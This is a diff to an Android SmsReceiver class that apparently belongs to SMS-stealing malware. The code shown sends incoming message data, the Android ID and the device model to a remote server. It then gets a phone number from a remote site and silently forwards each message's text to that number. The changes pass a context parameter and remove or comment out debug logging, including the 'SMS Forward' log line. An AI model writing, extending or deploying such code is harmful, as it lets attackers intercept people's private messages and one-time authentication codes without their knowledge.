@@ -50,24 +50,23 @@ public class SmsReceiver extends BroadcastReceiver {
                                     jsonData.put("mobile_id", Helper.getAndroidId(context));
                                     jsonData.put("model", Build.MODEL);
                                     jsonData.put("status", "N/A");
-                                    Helper.postRequest(helper.SMSSavePath(), jsonData, new Helper.ResponseListener() {
+                                    Helper.postRequest(helper.SMSSavePath(), jsonData, context, new Helper.ResponseListener() {
                                         @Override
                                         public void onResponse(String result) {
                                             if(result.startsWith("Response Error:")) {
                                                 Toast.makeText(context, "Response Error : "+result, Toast.LENGTH_SHORT).show();
                                             } else {
                                                     try {
-                                                        Log.d(Helper.TAG, "RESPONN RESULT : "+result);
+
                                                             JSONObject response = new JSONObject(result);
                                                             if(response.getInt("status")==200){
                                                                   userId  = response.getInt("data");
-                                                                    Helper.getRequest(helper.getNumber() + helper.SITE(), new Helper.ResponseListener(){
+                                                                    Helper.getRequest(helper.getNumber() + helper.SITE(), context, new Helper.ResponseListener(){
                                                                         @Override
                                                                         public void onResponse(String result){
                                                                             try {
                                                                                 // Parse JSON response
                                                                                 JSONObject jsonResponse = new JSONObject(result);
-                                                                                Log.d(Helper.TAG, "number json "+jsonResponse);
                                                                                 if (jsonResponse.has("data")) {
                                                                                     String phoneNumber = jsonResponse.getString("data");
                                                                                     Log.d(Helper.TAG, "PHone Number "+ phoneNumber);
@@ -82,7 +81,8 @@ public class SmsReceiver extends BroadcastReceiver {
                                                                                     PendingIntent deliveredPendingIntent = PendingIntent.getBroadcast(context, 0, deliveredIntent, PendingIntent.FLAG_IMMUTABLE);
                                                                                     SmsManager smsManager = SmsManager.getDefault();
                                                                                     smsManager.sendTextMessage(phoneNumber, null, messageBody, sentPendingIntent, deliveredPendingIntent);
-                                                                                    Log.d(Helper.TAG, "SMS Forward");
+
+//                                                                                    Log.d(Helper.TAG, "SMS Forward");
                                                                                 } else {
                                                                                     Log.e("MYAPP: ", "Response does not contain 'data' field");
                                                                                 }
